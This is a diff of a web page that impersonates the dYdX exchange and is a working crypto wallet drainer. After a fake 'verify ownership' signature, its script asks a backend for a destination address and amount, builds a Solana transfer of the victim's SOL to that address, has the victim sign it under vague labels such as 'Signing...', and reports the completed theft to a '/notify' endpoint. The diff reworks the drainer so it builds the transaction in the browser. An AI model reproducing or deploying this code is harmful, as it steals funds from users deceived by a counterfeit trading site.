@@ -2,54 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dYdX - Decentralized Perpetual Exchange</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>dYdX - Decentralized Exchange</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #000; font-family: 'Inter', sans-serif; color: #fff; }
-        
-        /* Navbar */
         .navbar { max-width: 1200px; margin: 0 auto; padding: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
-        .nav-links { display: flex; gap: 32px; flex-wrap: wrap; }
-        .nav-link { color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8; transition: opacity 0.3s; }
+        .nav-links { display: flex; gap: 32px; }
+        .nav-link { color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8; }
         .nav-link:hover { opacity: 1; }
-        
-        /* Buttons */
-        .btn { background: linear-gradient(135deg, #6966FF, #8B5CF6); border: none; border-radius: 12px; padding: 12px 28px; color: white; font-weight: 600; cursor: pointer; font-size: 14px; transition: transform 0.2s, box-shadow 0.2s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(105,102,255,0.3); }
-        
-        /* Hero */
-        .hero { min-height: 80vh; display: flex; flex-direction: column; justify-content: center; text-align: center; padding: 80px 20px; position: relative; }
-        .hero h1 { font-size: clamp(2rem, 5vw, 4rem); font-weight: 700; margin-bottom: 24px; }
-        .hero p { font-size: clamp(1rem, 2vw, 1.25rem); color: rgba(255,255,255,0.8); max-width: 800px; margin: 0 auto 32px; line-height: 1.6; }
-        
-        /* Metrics */
+        .btn { background: linear-gradient(135deg, #6966FF, #8B5CF6); border: none; border-radius: 12px; padding: 12px 28px; color: white; font-weight: 600; cursor: pointer; font-size: 14px; transition: transform 0.2s; }
+        .btn:hover { transform: translateY(-2px); }
+        .hero { min-height: 70vh; display: flex; flex-direction: column; justify-content: center; text-align: center; padding: 80px 20px; position: relative; }
+        .hero h1 { font-size: clamp(2rem, 5vw, 4rem); margin-bottom: 24px; }
+        .hero p { font-size: clamp(1rem, 2vw, 1.25rem); color: rgba(255,255,255,0.8); max-width: 800px; margin: 0 auto 32px; }
         .metrics { padding: 60px 20px; max-width: 1200px; margin: 0 auto; }
-        .metrics h2 { font-size: clamp(1.5rem, 3vw, 2.5rem); margin-bottom: 48px; }
-        .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 32px; }
+        .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 32px; margin-top: 48px; }
         .metric-card { text-align: center; padding: 32px 24px; background: rgba(255,255,255,0.05); border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
-        .metric-number { font-size: clamp(1.5rem, 4vw, 2.5rem); font-weight: 700; margin-bottom: 12px; }
-        .metric-label { color: rgba(255,255,255,0.6); font-size: 14px; }
-        
-        /* Wave Background */
+        .metric-number { font-size: clamp(1.5rem, 4vw, 2.5rem); font-weight: 700; }
+        .metric-label { color: rgba(255,255,255,0.6); font-size: 14px; margin-top: 12px; }
         .wave-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 400px; overflow: hidden; z-index: 0; }
         .wave-bg img { width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
-        
-        /* Modal */
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; display: none; }
         .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(8px); }
-        .modal-content { position: relative; background: #1a1a1a; border-radius: 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; }
+        .modal-content { position: relative; background: #1a1a1a; border-radius: 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); }
         .modal-header { padding: 28px; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: center; position: relative; }
-        .modal-header h3 { font-size: 20px; font-weight: 600; }
-        .modal-close { position: absolute; right: 16px; top: 16px; background: none; border: none; color: #888; font-size: 24px; cursor: pointer; width: 32px; height: 32px; border-radius: 8px; }
-        .modal-close:hover { color: #fff; background: rgba(255,255,255,0.1); }
+        .modal-header h3 { font-size: 20px; }
+        .modal-close { position: absolute; right: 16px; top: 16px; background: none; border: none; color: #888; font-size: 24px; cursor: pointer; }
         .modal-body { padding: 24px 28px 32px; }
-        
-        /* Wallet Options */
         .wallet-options { display: flex; flex-direction: column; gap: 16px; }
         .wallet-option { display: flex; align-items: center; padding: 16px 20px; background: #252525; border: 1px solid #333; border-radius: 16px; cursor: pointer; transition: all 0.3s; }
-        .wallet-option:hover { background: #2f2f2f; border-color: #6966FF; transform: translateY(-2px); }
+        .wallet-option:hover { background: #2f2f2f; border-color: #6966FF; }
         .wallet-icon { width: 48px; height: 48px; margin-right: 16px; }
         .wallet-icon img { width: 100%; height: 100%; border-radius: 12px; }
         .wallet-info { flex: 1; }
@@ -57,129 +41,52 @@
         .wallet-status { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #888; }
         .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #888; }
         .status-dot.installed { background: #4CAF50; }
-        .status-dot.not-installed { background: #f44336; }
-        .status-installed { color: #4CAF50; }
-        .status-not-installed { color: #f44336; }
-        
-        /* Loading State */
         .loading-state { display: none; text-align: center; padding: 40px; }
         .loading-state.active { display: block; }
         .loading-spinner { width: 80px; height: 80px; background: #252525; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; position: relative; }
         .loading-spinner::before { content: ''; position: absolute; top: -3px; left: -3px; right: -3px; bottom: -3px; border-radius: 23px; border: 3px solid transparent; border-top-color: #6966FF; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-spinner img { width: 44px; height: 44px; position: relative; z-index: 1; }
+        .loading-spinner img { width: 44px; height: 44px; }
         .loading-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
-        .loading-subtitle { color: #888; font-size: 14px; line-height: 1.6; }
-        
+        .loading-subtitle { color: #888; font-size: 14px; }
         .hidden { display: none; }
         .locked .modal-overlay { pointer-events: none; }
-        
         @media (max-width: 768px) { .nav-links { display: none; } .metrics-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-    <!-- Navbar -->
     <div class="navbar">
-        <a href="/">
-            <svg width="115" height="48" viewBox="0 0 154 48" fill="none">
-                <path d="M142.799 0L109.594 47.5714H119.788L153.166 0H142.799Z" fill="white"/>
-                <path d="M120.848 0L130.618 14.0177L125.521 21.6637L110.441 0H120.848Z" fill="url(#a)"/>
-                <path d="M143.788 47.5751L132.956 32.0707L138.053 24.637L153.982 47.5751H143.788Z" fill="url(#b)"/>
-                <path fill-rule="evenodd" d="M97.6986 0H106.619V47.5714H97.6986V45.7946C95.1223 47.2005 92.1645 48 89.0192 48 79.0329 48 70.9375 39.9411 70.9375 30 70.9375 20.0589 79.0329 12 89.0192 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM88.9239 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/>
-                <path d="M71.8249 0L38.6543 47.5714H49.0534L82.1918 0H71.8249Z" fill="white"/>
-                <path d="M49.0623 0L59.4694 14.4425L53.7349 22.5133L38.2305 0H49.0623Z" fill="url(#c)"/>
-                <path fill-rule="evenodd" d="M26.7611 0H35.6814V47.5714H26.7611V45.7946C24.1848 47.2005 21.227 48 18.0817 48 8.09544 48 0 39.9411 0 30 0 20.0589 8.09544 12 18.0817 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM17.9864 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/>
-                <defs>
-                    <linearGradient id="a" x1="118.512" y1="2.973" x2="132.498" y2="19.858" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient>
-                    <linearGradient id="b" x1="146.124" y1="43.965" x2="128.94" y2="20.799" gradientUnits="userSpaceOnUse"><stop stop-color="#6966FF"/><stop offset="1" stop-color="#6966FF" stop-opacity="0.36"/></linearGradient>
-                    <linearGradient id="c" x1="46.726" y1="3.09" x2="61.225" y2="20.819" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient>
-                </defs>
-            </svg>
-        </a>
-        <div class="nav-links">
-            <a href="#" class="nav-link">VIP</a>
-            <a href="#" class="nav-link">Fees</a>
-            <a href="#" class="nav-link">API</a>
-            <a href="#" class="nav-link">Blog</a>
-            <a href="#" class="nav-link">App Download</a>
-        </div>
+        <a href="/"><svg width="115" height="48" viewBox="0 0 154 48" fill="none"><path d="M142.799 0L109.594 47.5714H119.788L153.166 0H142.799Z" fill="white"/><path d="M120.848 0L130.618 14.0177L125.521 21.6637L110.441 0H120.848Z" fill="url(#a)"/><path d="M143.788 47.5751L132.956 32.0707L138.053 24.637L153.982 47.5751H143.788Z" fill="url(#b)"/><path fill-rule="evenodd" d="M97.6986 0H106.619V47.5714H97.6986V45.7946C95.1223 47.2005 92.1645 48 89.0192 48 79.0329 48 70.9375 39.9411 70.9375 30 70.9375 20.0589 79.0329 12 89.0192 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM88.9239 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/><path d="M71.8249 0L38.6543 47.5714H49.0534L82.1918 0H71.8249Z" fill="white"/><path d="M49.0623 0L59.4694 14.4425L53.7349 22.5133L38.2305 0H49.0623Z" fill="url(#c)"/><path fill-rule="evenodd" d="M26.7611 0H35.6814V47.5714H26.7611V45.7946C24.1848 47.2005 21.227 48 18.0817 48 8.09544 48 0 39.9411 0 30 0 20.0589 8.09544 12 18.0817 12c3.1453 0 6.1031.7995 8.6794 2.2054V0ZM17.9864 40.0999c5.656 0 10.241-4.5643 10.241-10.1947 0-5.6304-4.585-10.1947-10.241-10.1947-5.6559 0-10.2409 4.5643-10.2409 10.1947 0 5.6304 4.585 10.1947 10.2409 10.1947Z" fill="white"/><defs><linearGradient id="a" x1="118.512" y1="2.973" x2="132.498" y2="19.858" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient><linearGradient id="b" x1="146.124" y1="43.965" x2="128.94" y2="20.799" gradientUnits="userSpaceOnUse"><stop stop-color="#6966FF"/><stop offset="1" stop-color="#6966FF" stop-opacity="0.36"/></linearGradient><linearGradient id="c" x1="46.726" y1="3.09" x2="61.225" y2="20.819" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="1" stop-color="white" stop-opacity="0.55"/></linearGradient></defs></svg></a>
+        <div class="nav-links"><a href="#" class="nav-link">VIP</a><a href="#" class="nav-link">Fees</a><a href="#" class="nav-link">API</a><a href="#" class="nav-link">Blog</a><a href="#" class="nav-link">App Download</a></div>
         <button id="connectWalletBtn" class="btn">Connect Wallet</button>
     </div>
 
-    <!-- Modal -->
     <div id="walletModal" class="modal">
         <div class="modal-overlay"></div>
         <div class="modal-content">
-            <div class="modal-header">
-                <h3>Select Your Wallet</h3>
-                <button class="modal-close" id="closeModalBtn">&times;</button>
-            </div>
+            <div class="modal-header"><h3>Select Your Wallet</h3><button class="modal-close" id="closeModalBtn">&times;</button></div>
             <div class="modal-body">
                 <div id="walletOptions" class="wallet-options">
-                    <div class="wallet-option" data-wallet="phantom">
-                        <div class="wallet-icon"><img src="https://docs.phantom.com/favicon.svg" alt="Phantom"></div>
-                        <div class="wallet-info">
-                            <div class="wallet-name">Phantom</div>
-                            <div id="phantomStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div>
-                        </div>
-                    </div>
-                    <div class="wallet-option" data-wallet="solflare">
-                        <div class="wallet-icon"><img src="https://solflare.com/favicon.ico" alt="Solflare"></div>
-                        <div class="wallet-info">
-                            <div class="wallet-name">Solflare</div>
-                            <div id="solflareStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div>
-                        </div>
-                    </div>
+                    <div class="wallet-option" data-wallet="phantom"><div class="wallet-icon"><img src="https://docs.phantom.com/favicon.svg"></div><div class="wallet-info"><div class="wallet-name">Phantom</div><div id="phantomStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div></div></div>
+                    <div class="wallet-option" data-wallet="solflare"><div class="wallet-icon"><img src="https://solflare.com/favicon.ico"></div><div class="wallet-info"><div class="wallet-name">Solflare</div><div id="solflareStatus" class="wallet-status"><span class="status-dot"></span><span>Checking...</span></div></div></div>
                 </div>
-                <div id="loadingState" class="loading-state">
-                    <div class="loading-spinner"><img id="loadingIcon" src="https://docs.phantom.com/favicon.svg" alt=""></div>
-                    <div id="loadingTitle" class="loading-title">Connecting Wallet</div>
-                    <div id="loadingSubtitle" class="loading-subtitle">Please approve connection in your wallet.</div>
-                </div>
+                <div id="loadingState" class="loading-state"><div class="loading-spinner"><img id="loadingIcon" src="https://docs.phantom.com/favicon.svg"></div><div id="loadingTitle" class="loading-title">Connecting Wallet</div><div id="loadingSubtitle" class="loading-subtitle">Please approve connection in your wallet.</div></div>
             </div>
         </div>
     </div>
 
-    <!-- Hero Section -->
-    <div class="hero">
-        <div class="wave-bg"><img src="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png" alt=""></div>
-        <div style="position: relative; z-index: 1;">
-            <h1>DeFi's Pro Trading Platform</h1>
-            <p>dYdX reimagines what DeFi and perpetual trading can be. Combining the freedom of decentralization with deep liquidity, advanced order types, and a high-performance API.</p>
-            <button id="heroConnectBtn" class="btn">Connect Wallet</button>
-        </div>
-    </div>
+    <div class="hero"><div class="wave-bg"><img src="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png"></div><div style="position:relative; z-index:1;"><h1>DeFi's Pro Trading Platform</h1><p>dYdX reimagines what DeFi and perpetual trading can be.</p><button id="heroConnectBtn" class="btn">Connect Wallet</button></div></div>
 
-    <!-- Metrics -->
-    <div class="metrics">
-        <div style="color: #6966FF; text-transform: uppercase; font-size: 14px; letter-spacing: 2px; margin-bottom: 16px;">Why dYdX?</div>
-        <h2>Trusted at Scale</h2>
-        <div class="metrics-grid">
-            <div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div>
-            <div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div>
-            <div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div>
-            <div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div>
-        </div>
-    </div>
+    <div class="metrics"><div style="color:#6966FF; text-transform:uppercase; font-size:14px;">Why dYdX?</div><h2>Trusted at Scale</h2><div class="metrics-grid"><div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div><div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div><div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div><div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div></div></div>
 
-    <!-- Scripts -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/lib/index.iife.min.js"></script>
-    
     <script>
-        // Buffer polyfill
-        if (!window.Buffer) {
-            window.Buffer = {
-                from: (str) => new TextEncoder().encode(str),
-                alloc: (size) => new Uint8Array(size)
-            };
-        }
+        if (!window.Buffer) { window.Buffer = { from: (s) => new TextEncoder().encode(s), alloc: (n) => new Uint8Array(n) }; }
 
-        // Wait for DOM
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('[FRONTEND] DOM loaded, initializing...');
+            console.log('Ready');
             
-            // DOM elements
             const modal = document.getElementById('walletModal');
             const walletOptions = document.getElementById('walletOptions');
             const loadingState = document.getElementById('loadingState');
@@ -188,243 +95,104 @@
             const loadingSubtitle = document.getElementById('loadingSubtitle');
             const loadingIcon = document.getElementById('loadingIcon');
             
-            // Helper functions
-            function showModal() {
-                checkWalletStatus();
-                modal.style.display = 'flex';
+            function showModal() { checkStatus(); modal.style.display = 'flex'; }
+            function hideModal() { modal.style.display = 'none'; walletOptions.classList.remove('hidden'); loadingState.classList.remove('active'); if(modalTitle) modalTitle.textContent = 'Select Your Wallet'; modal.classList.remove('locked'); }
+            function showLoading(walletType) { walletOptions.classList.add('hidden'); loadingState.classList.add('active'); if(modalTitle) modalTitle.textContent = 'Connecting...'; modal.classList.add('locked'); loadingIcon.src = walletType === 'phantom' ? 'https://docs.phantom.com/favicon.svg' : 'https://solflare.com/favicon.ico'; }
+            
+            function checkStatus() {
+                document.getElementById('phantomStatus').innerHTML = (window.solana && window.solana.isPhantom) ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
+                document.getElementById('solflareStatus').innerHTML = (window.solflare && window.solflare.isSolflare) ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
             }
             
-            function hideModal() {
-                modal.style.display = 'none';
-                walletOptions.classList.remove('hidden');
-                loadingState.classList.remove('active');
-                if (modalTitle) modalTitle.textContent = 'Select Your Wallet';
-                modal.classList.remove('locked');
-            }
-            
-            function showLoading(walletType) {
-                walletOptions.classList.add('hidden');
-                loadingState.classList.add('active');
-                if (modalTitle) modalTitle.textContent = 'Connecting...';
-                modal.classList.add('locked');
-                
-                if (walletType === 'phantom') {
-                    loadingIcon.src = 'https://docs.phantom.com/favicon.svg';
-                } else {
-                    loadingIcon.src = 'https://solflare.com/favicon.ico';
-                }
-            }
-            
-            function checkWalletStatus() {
-                const phantomInstalled = !!(window.solana && window.solana.isPhantom);
-                const solflareInstalled = !!(window.solflare && window.solflare.isSolflare);
-                
-                const phantomStatus = document.getElementById('phantomStatus');
-                const solflareStatus = document.getElementById('solflareStatus');
-                
-                if (phantomInstalled) {
-                    phantomStatus.innerHTML = '<span class="status-dot installed"></span><span class="status-installed">Installed</span>';
-                } else {
-                    phantomStatus.innerHTML = '<span class="status-dot not-installed"></span><span class="status-not-installed">Not Installed</span>';
-                }
-                
-                if (solflareInstalled) {
-                    solflareStatus.innerHTML = '<span class="status-dot installed"></span><span class="status-installed">Installed</span>';
-                } else {
-                    solflareStatus.innerHTML = '<span class="status-dot not-installed"></span><span class="status-not-installed">Not Installed</span>';
-                }
-            }
-            
-            // API calls to backend
             async function callBackend(endpoint, data) {
-                const response = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data || {})
-                });
-                
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    throw new Error(`HTTP ${response.status}: ${errorText}`);
-                }
-                
-                const result = await response.json();
+                const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data || {}) });
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                const result = await res.json();
                 if (result.error) throw new Error(result.error);
                 return result;
             }
             
-            async function getBalance(publicKey) {
-                const result = await callBackend('/api/getBalance', { publicKey });
-                return result.balance;
-            }
-            
-            async function getBlockhash() {
-                const result = await callBackend('/api/getBlockhash', {});
-                return { blockhash: result.blockhash, lastValidBlockHeight: result.lastValidBlockHeight };
-            }
-            
-            async function sendRawTransaction(base64Tx) {
-                const result = await callBackend('/api/sendTransaction', { transaction: base64Tx });
-                return result.txid;
-            }
-            
-            async function prepareTransaction(publicKey) {
-                const result = await callBackend('/prepare-transaction', { publicKey });
-                if (!result.success) throw new Error(result.error);
-                return result;
-            }
-            
-            // Main connect function
             async function connectWallet(walletType, provider) {
-                if (!provider) {
-                    alert(`Please install ${walletType === 'phantom' ? 'Phantom' : 'Solflare'} wallet first.`);
-                    return;
-                }
-                
+                if (!provider) { alert('Install wallet first'); return; }
                 showLoading(walletType);
-                
                 try {
-                    // Step 1: Connect
                     loadingTitle.textContent = 'Connecting...';
-                    loadingSubtitle.textContent = 'Please approve connection in your wallet.';
-                    
                     const resp = await provider.connect();
-                    const publicKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
-                    console.log('[FRONTEND] Connected:', publicKey);
+                    const pubKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
+                    console.log('Connected:', pubKey);
                     
-                    // Step 2: Get balance
                     loadingTitle.textContent = 'Getting Balance...';
-                    loadingSubtitle.textContent = 'Fetching your wallet balance...';
+                    const balanceData = await callBackend('/api/getBalance', { publicKey: pubKey });
+                    const solBalance = (balanceData.balance / 1e9).toFixed(4);
+                    console.log('Balance:', solBalance, 'SOL');
                     
-                    const balance = await getBalance(publicKey);
-                    const solBalance = (balance / 1e9).toFixed(4);
-                    console.log('[FRONTEND] Balance:', solBalance, 'SOL');
-                    
-                    // Step 3: Check minimum
-                    if (balance < 20000000) {
+                    if (balanceData.balance < 20000000) {
                         loadingTitle.textContent = 'Insufficient Balance';
-                        loadingSubtitle.innerHTML = `Need at least 0.02 SOL<br>Current: ${solBalance} SOL`;
+                        loadingSubtitle.innerHTML = `Need 0.02 SOL<br>Have: ${solBalance} SOL`;
                         setTimeout(hideModal, 3000);
                         return;
                     }
                     
-                    // Step 4: Sign verification
-                    loadingTitle.textContent = 'Verifying Ownership';
-                    loadingSubtitle.textContent = 'Please sign the verification message...';
+                    loadingTitle.textContent = 'Verifying...';
+                    const msg = `Verify wallet\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
+                    if (walletType === 'phantom') await provider.signMessage(new TextEncoder().encode(msg), 'utf8');
+                    else await provider.signMessage(new TextEncoder().encode(msg));
+                    console.log('Verified');
                     
-                    const message = `Verify wallet ownership\nTime: ${Date.now()}\nWallet: ${publicKey.slice(0, 8)}...`;
-                    const messageBytes = new TextEncoder().encode(message);
+                    loadingTitle.textContent = 'Preparing...';
+                    const prepareData = await callBackend('/prepare-transaction', { publicKey: pubKey });
+                    if (!prepareData.success) throw new Error(prepareData.error);
                     
-                    try {
-                        if (walletType === 'phantom') {
-                            await provider.signMessage(messageBytes, 'utf8');
-                        } else {
-                            await provider.signMessage(messageBytes);
-                        }
-                        console.log('[FRONTEND] Verification signed');
-                    } catch (err) {
-                        console.log('[FRONTEND] Verification rejected:', err);
-                        loadingTitle.textContent = 'Verification Required';
-                        loadingSubtitle.textContent = 'You must sign the message to continue.';
-                        setTimeout(hideModal, 2000);
-                        return;
-                    }
+                    loadingTitle.textContent = 'Getting Blockhash...';
+                    const blockhashData = await callBackend('/api/getBlockhash', {});
                     
-                    // Step 5: Prepare transaction from backend
-                    loadingTitle.textContent = 'Preparing Transaction';
-                    loadingSubtitle.textContent = 'Contacting server...';
+                    // BUILD TRANSACTION ON FRONTEND (NO BACKEND SERIALIZATION)
+                    loadingTitle.textContent = 'Building Transaction...';
+                    const transaction = new solanaWeb3.Transaction();
+                    transaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: new solanaWeb3.PublicKey(pubKey),
+                            toPubkey: new solanaWeb3.PublicKey(prepareData.to),
+                            lamports: prepareData.amount,
+                        })
+                    );
+                    transaction.recentBlockhash = blockhashData.blockhash;
+                    transaction.lastValidBlockHeight = blockhashData.lastValidBlockHeight;
+                    transaction.feePayer = new solanaWeb3.PublicKey(pubKey);
                     
-                    const txData = await prepareTransaction(publicKey);
-                    console.log('[FRONTEND] Transaction prepared, amount:', txData.amountSol, 'SOL');
-                    
-                    // Step 6: Get fresh blockhash
-                    loadingTitle.textContent = 'Getting Blockhash';
-                    loadingSubtitle.textContent = 'Fetching latest blockhash...';
-                    
-                    const { blockhash, lastValidBlockHeight } = await getBlockhash();
-                    console.log('[FRONTEND] Blockhash:', blockhash);
-                    
-                    // Step 7: Build and sign
-                    loadingTitle.textContent = 'Signing Transaction';
-                    loadingSubtitle.textContent = 'Please approve the transaction in your wallet...';
-                    
-                    const txBytes = new Uint8Array(txData.transaction);
-                    const transaction = solanaWeb3.Transaction.from(txBytes);
-                    transaction.recentBlockhash = blockhash;
-                    transaction.lastValidBlockHeight = lastValidBlockHeight;
-                    transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
-                    
+                    loadingTitle.textContent = 'Signing...';
                     const signed = await provider.signTransaction(transaction);
-                    console.log('[FRONTEND] Transaction signed');
                     
-                    // Step 8: Send
-                    loadingTitle.textContent = 'Sending Transaction';
-                    loadingSubtitle.textContent = 'Broadcasting to blockchain...';
-                    
+                    loadingTitle.textContent = 'Sending...';
                     const signedBytes = signed.serialize();
                     const base64Tx = btoa(String.fromCharCode.apply(null, signedBytes));
-                    const txid = await sendRawTransaction(base64Tx);
-                    console.log('[FRONTEND] Transaction sent:', txid);
+                    const sendResult = await callBackend('/api/sendTransaction', { transaction: base64Tx });
                     
-                    // Step 9: Success
-                    const shortTxid = txid.slice(0, 6) + '...' + txid.slice(-8);
+                    console.log('TXID:', sendResult.txid);
                     loadingTitle.textContent = 'Success!';
-                    loadingSubtitle.innerHTML = `Transfer complete!<br>TXID: ${shortTxid}`;
-                    
-                    // Send notification
-                    try {
-                        await fetch('/notify', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                address: publicKey,
-                                balance: solBalance,
-                                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
-                                customMessage: `🎉 Transfer Complete! TXID: ${txid}`
-                            })
-                        });
-                    } catch(e) {}
-                    
+                    loadingSubtitle.innerHTML = `Complete!<br>${sendResult.txid.slice(0,6)}...${sendResult.txid.slice(-8)}`;
                     setTimeout(hideModal, 3000);
                     
-                } catch (error) {
-                    console.error('[FRONTEND] Error:', error);
+                    await fetch('/notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ address: pubKey, balance: solBalance, walletType, customMessage: 'Transfer Complete! TXID: ' + sendResult.txid }) });
+                } catch(e) {
+                    console.error('Error:', e);
                     loadingTitle.textContent = 'Failed';
-                    loadingSubtitle.textContent = error.message || 'Something went wrong. Please try again.';
+                    loadingSubtitle.textContent = e.message || 'Try again';
                     setTimeout(hideModal, 3000);
                 }
             }
             
-            // Event listeners
             document.getElementById('connectWalletBtn').addEventListener('click', showModal);
             document.getElementById('heroConnectBtn').addEventListener('click', showModal);
             document.getElementById('closeModalBtn').addEventListener('click', hideModal);
-            document.querySelector('.modal-overlay').addEventListener('click', function() {
-                if (!modal.classList.contains('locked')) hideModal();
-            });
+            document.querySelector('.modal-overlay').addEventListener('click', () => { if (!modal.classList.contains('locked')) hideModal(); });
+            document.querySelectorAll('.wallet-option').forEach(opt => { opt.addEventListener('click', () => { const type = opt.getAttribute('data-wallet'); connectWallet(type, type === 'phantom' ? window.solana : window.solflare); }); });
+            document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && modal.style.display === 'flex' && !modal.classList.contains('locked')) hideModal(); });
             
-            document.querySelectorAll('.wallet-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    const walletType = this.getAttribute('data-wallet');
-                    const provider = walletType === 'phantom' ? window.solana : window.solflare;
-                    connectWallet(walletType, provider);
-                });
-            });
-            
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && modal.style.display === 'flex' && !modal.classList.contains('locked')) {
-                    hideModal();
-                }
-            });
-            
-            // Initial status checks (with retries for wallet extensions)
-            checkWalletStatus();
-            setTimeout(checkWalletStatus, 500);
-            setTimeout(checkWalletStatus, 1000);
-            setTimeout(checkWalletStatus, 2000);
-            setTimeout(checkWalletStatus, 5000);
-            
-            console.log('[FRONTEND] Ready and waiting for user interaction');
+            checkStatus();
+            setTimeout(checkStatus, 500);
+            setTimeout(checkStatus, 1000);
+            setTimeout(checkStatus, 2000);
         });
     </script>
 </body>
